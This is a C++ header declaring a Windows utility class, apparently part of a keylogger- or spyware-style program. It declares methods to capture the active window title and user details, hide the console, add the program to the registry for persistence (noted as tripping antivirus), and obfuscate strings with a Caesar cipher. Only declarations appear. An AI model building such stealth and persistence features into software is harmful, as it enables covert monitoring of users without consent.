#pragma once

#include <iostream>
#include <ctime>
#include <time.h>
#include <Windows.h>
#include <WinUser.h>
#include <lmcons.h>
#include <stdio.h>
#include <tchar.h>
#include <string>
#include <vector>

using namespace std;

#define INFO_BUFFER_SIZE 23767 // Used in GetMachineName()

// Static class containing usefull methods intereacting with Windows OS directly
class Utilities
{
public:

	// GetMachineName() : Return the machine name of the computer running this program
	static string GetMachineName();

	// GetUsername() : Return the user name of the user runnig this program
	static string GetUsername();

	// GetActiveWindow() : Return the title of the current active window displayed on screen
	static string GetActiveWindow();

	//  GetSystemDir() : Return the path of the system directory
	static string GetSystemDir();

	// GetProgramFilePath() : Return the program file path
	static string GetProgramFilePath();

	// GetCurrentDate() :  Return the current date in a string 
	static string GetCurrentDate();

	// GetTime() : Return the current time in a string
	static string GetTime();

	// HideConsole() : Hide the program console window
	static void HideConsole();

	// AddToRegistry() : Add this program to the registry (Will trigger most anti-virus)
	static bool AddToRegistry();

	// CaesarCypher Encrypt & Decrypt (string, int) :
	static string CaesarCypherEncrypt(string content, int key);
	static string CaesarCypherDecrypt(string content, int key);

	// Doesn't work !! :(
	// RSA Encrypt & Decrypt (string, unsigned long int, unsigned long int) :
	static string RSA_Encrypt(string content, unsigned long int publicKey, unsigned long int privateKey);
	static string RSA_Decrypt(string content, unsigned long int publicKey, unsigned long int privateKey);
};